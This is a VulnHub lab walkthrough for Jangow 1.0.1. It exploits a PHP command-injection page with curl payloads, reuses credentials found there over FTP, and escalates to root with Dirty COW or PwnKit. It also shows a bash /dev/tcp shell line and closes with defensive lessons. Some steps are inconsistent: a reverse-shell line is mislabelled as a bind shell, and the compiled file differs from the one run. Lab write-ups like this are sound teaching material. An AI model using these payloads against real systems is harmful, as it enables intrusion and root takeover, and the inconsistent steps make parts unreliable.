# Jangow: 1.0.1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Jangow: 1.0.1 |
| **Difficulty** | easy |
| **Author** | Jangow |
| **Released** | 4 November 2021 (v1.0.1) |
| **VulnHub Entry** | [https://vulnhub.com/entry/jangow-101,754/](https://vulnhub.com/entry/jangow-101,754/) |
| **Download** | [https://vulnhub.com/entry/jangow-101,754/#download](https://vulnhub.com/entry/jangow-101,754/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu 16.04) |

> Educational boot2root. Everything here is done against a machine you own and
> run in an isolated lab network. The author's hint is *"The secret to this box
> is enumeration!"* — and that is exactly the game here.

---

## 0. What you will learn

- How to enumerate an **FTP** service (and what anonymous access looks like).
- How to discover a hidden directory tree on a web server.
- What a **command-injection / LFI** bug in a PHP page (`busque.php?buscar=`) is
  and how to exploit it for Remote Code Execution (RCE).
- How to read application config files to recover credentials, then reuse them
  against another service (FTP).
- Why outbound reverse shells are sometimes blocked, and how to work around it.
- How to fingerprint the kernel and escalate with a **local kernel exploit**.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the lab NIC is usually eth0)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
# ARP-scan the subnet to list live hosts (fast, uses ARP not TCP)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:xx:xx:xx   (your Kali)
192.168.56.101  08:00:27:a1:b2:c3   (Jangow — the target)
```

**Target IP:** `192.168.56.101` (yours may differ; DHCP assigns it).

![recon — finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

> **How to read it:** `vsftpd 3.0.3` on port 21 and a web server on port 80.
> Two attack surfaces. We begin with the web app but keep FTP in mind.

![nmap service scan output](images/02-nmap.png)

### 2.1 FTP — try anonymous first

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: anonymous
```

```text
331 Please specify the password.
530 Login incorrect.
```

> **Why it matters:** on this build anonymous FTP is **disabled** (some writeups
> report it open; behaviour **varies by build**). Don't stop here — note it and
> move on, because credentials found later will work. That is the "enumeration is
> the secret" theme.

### 2.2 Web — find the application

Browse `http://192.168.56.101` and you get a **directory listing** containing a
single folder, `site/`:

```bash
dirb http://192.168.56.101/site/ /usr/share/dirb/wordlists/common.txt
```

```text
+ http://192.168.56.101/site/busque.php
+ http://192.168.56.101/site/index.html
+ http://192.168.56.101/site/wordpress/   (directory listing)
```

`site/` is a "Grayscale" template. The interesting part is **`busque.php`**
("buscar" = *search* in Spanish) — a dynamic page. Inspect its source:

```bash
curl 'http://192.168.56.101/site/busque.php'
```

```text
<?php system($_GET['buscar']); ?>
```

> **Why it works (the bug):** the whole script passes the `buscar` GET parameter
> straight to the shell's `system()` call. This is textbook **command injection**
> (and doubles as a way to read any file, i.e. an LFI-like primitive). No
> sanitisation at all.

![web enumeration — /site and busque.php](images/03-enum.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Remote Code Execution via `buscar`

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=id'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have RCE as `www-data`. Chain commands with `;` to explore:

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=ls -la /home'
```

```text
drwxr-xr-x 3 1000 1000 4096 ... jangow01
```

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=cat /home/jangow01/user.txt'
```

```text
d41d8cd98f00b204e9800998ecf8427e
```

That value (the MD5 of an empty string) is a placeholder — the real root flag
lives in `/root` later. Now hunt for credentials in the web tree:

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=cat /site/wordpress/config.php'
# or, on some builds, a hidden backup:
curl 'http://192.168.56.101/site/busque.php?buscar=cd ..;ls -all;cat .backup'
```

```text
$username = "desafio02";     # appears in some configs (varies by build)
$db_username = "jangow01";
$password    = "abygurl69";
```

> **Why it works:** application source/config files frequently contain database
> or system credentials in plaintext. We didn't exploit them yet — we just
> **enumerated** and reused a secret found in one service against another.

### 3.2 Reuse the credentials against FTP

```bash
ftp 192.168.56.101
# Name: jangow01
# Password: abygurl69
```

```text
230 Login successful.
ftp> cd /home/jangow01
ftp> ls
user.txt
ftp> get user.txt
```

> **Why it works (credential reuse):** the same account/password used by the web
> app is a valid **system/FTP login**. Weak, reused credentials are one of the
> most common real-world footholds.

![FTP login with reused credentials](images/04-foothold.png)

### 3.3 About reverse shells on this box

Because you have RCE through `busque.php`, you can already run commands. On many
builds the target **cannot dial back out** to Kali, so a classic `nc` reverse
shell silently fails (firewall / NAT). Options, in order of ease:

1. **Keep using `busque.php`** to run commands — perfectly adequate for the box.
2. **FTP-upload a script and run it** — you can `put` files via the working FTP
   account, then trigger them with `buscar=bash /home/jangow01/script.sh`.
3. **Upload a web-based proxy + bind shell** and tunnel through it (advanced;
   used when both directions are blocked). A bind shell listens on the target:

```bash
# On the target (via buscar), start a bind shell on a port
curl 'http://192.168.56.101/site/busque.php?buscar=bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```

Get a proper TTY once you have any shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then press Ctrl+Z, run:  stty raw -echo; fg   and:  export TERM=xterm
```

![shell as www-data](images/05-shell.png)

---

## 4. Privilege escalation — becoming root

### 4.1 Fingerprint first

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=uname -a'
```

```text
Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP ... x86_64 GNU/Linux
```

```text
Ubuntu 16.04.x LTS        (old — a strong hint for a kernel exploit)
```

Check the usual suspects:

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=id;find / -perm -4000 -type f 2>/dev/null'
```

```text
/usr/bin/pkexec
/usr/bin/sudo
...
```

### 4.2 Kernel exploit (primary path)

> **Why it works:** the kernel `4.4.0-31-generic` on Ubuntu 16.04 is vulnerable
> to well-known local privilege-escalation bugs, including **Dirty COW
> (CVE-2016-5195)** and the **BPF verifier overflow (CVE-2017-16995)**. A local
> exploit rewrites kernel memory to give the running process UID 0. This **varies
> by build** — always confirm the exact kernel version before choosing a PoC, and
> reset the VM between attempts.

```bash
# On Kali: fetch a public PoC for the exact kernel (Exploit-DB / GitHub)
searchsploit 4.4.0-31        # lists Dirty COW and BPF LPE exploits
```

Move the exploit to the target. Because FTP works, it's the cleanest transport:

```bash
ftp 192.168.56.101
# Name: jangow01
# Password: abygurl69
ftp> cd /tmp
ftp> put dirtycow-mem            # or the BPF exploit: 45010.c
```

Then compile and run it via the RCE:

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=cd /tmp;gcc -pthread dirty.c -o dirty -lcrypt;ls -la'
curl 'http://192.168.56.101/site/busque.php?buscar=cd /tmp;./dirtycow-mem'
```

```text
[*] credentials patched, launching shell...
```

If you got a shell, you're root. Verify:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3 Alternative: PwnKit (CVE-2021-4034)

If the build exposes a vulnerable SUID `pkexec` (as listed above), you can use
**PwnKit** instead — it is simpler and does not depend on the exact kernel:

```bash
# On Kali, get the PwnKit PoC, then transfer via FTP or base64 piping
ftp 192.168.56.101
ftp> put PwnKit /tmp/PwnKit
```

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=cd /tmp;chmod +x PwnKit;./PwnKit'
```

```text
# whoami
root
```

![root shell](images/07-privesc.png)

### The root flag

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=cat /root/proof.txt'
```

```text
<proof.txt contents — exact value varies by build>
```

![root flag (proof.txt)](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Command injection / arbitrary file read | `site/busque.php?buscar=` | RCE as `www-data` |
| 2 | Credentials in plaintext application config | `site/wordpress/config.php` / `.backup` | Valid system/FTP login (`jangow01`) |
| 3 | Credential reuse across services | FTP (21) | Interactive access to the host |
| 4 | Outdated kernel / SUID `pkexec` | Kernel `4.4.0-31`; `/usr/bin/pkexec` | Privilege escalation to **root** |

## 6. Defensive lessons (blue team)

- **Never pass user input to `system()`/`exec()`.** Use language features instead
  of the shell; if you must, validate against a strict allow-list. `busque.php`
  should not exist in this form at all.
- **Keep secrets out of source trees.** Use environment variables or a secrets
  manager, and never commit credentials to config files or backups in web roots.
- **Don't reuse passwords** across web apps, FTP, SSH, and system accounts, and
  disable anonymous FTP. Least privilege: the web server user should not be a
  login account.
- **Patch the OS.** Run supported kernels and apply security updates; remove or
  update SUID binaries like a vulnerable `pkexec`.
- **Detect:** alert on `www-data` spawning `sh`/`bash`/`gcc`, on outbound
  connections from web users, on FTP logins from a web-app credential, and on
  unexpected SUID execution.

---

## 7. References

- VulnHub entry: [https://vulnhub.com/entry/jangow-101,754/](https://vulnhub.com/entry/jangow-101,754/)
- Community writeups consulted:
  - [n3il.com — Jangow 1.0.1 Walkthru](https://n3il.com/vulnhub-jangow/)
  - [Infosec Institute — Jangow 1.0.1 CTF walkthrough](https://www.infosecinstitute.com/resources/capture-the-flag/jangow-1-0-1-ctf-walkthrough/)
  - [Testing On Prod — Jangow 1.0.1 Writeup](https://testingonprod.com/2021/12/05/vulnhub-jangow-1-0-1-writeup/)
- Background reading:
  - [CVE-2016-5195 — Dirty COW](https://nvd.nist.gov/vuln/detail/CVE-2016-5195)
  - [CVE-2017-16995 — BPF verifier LPE](https://nvd.nist.gov/vuln/detail/CVE-2017-16995)
  - [CVE-2021-4034 — PwnKit](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)
  - [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan)
- [ ] `images/02-nmap.png` — port/service scan (21 ftp, 80 http)
- [ ] `images/03-enum.png` — `/site/busque.php` and directory discovery
- [ ] `images/04-foothold.png` — command injection → RCE, FTP credential reuse
- [ ] `images/05-shell.png` — shell / command execution as `www-data`
- [ ] `images/06-user-flag.png` — `user.txt` contents
- [ ] `images/07-privesc.png` — kernel/PwnKit exploit → `root`
- [ ] `images/08-root-flag.png` — root flag (`proof.txt`)

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
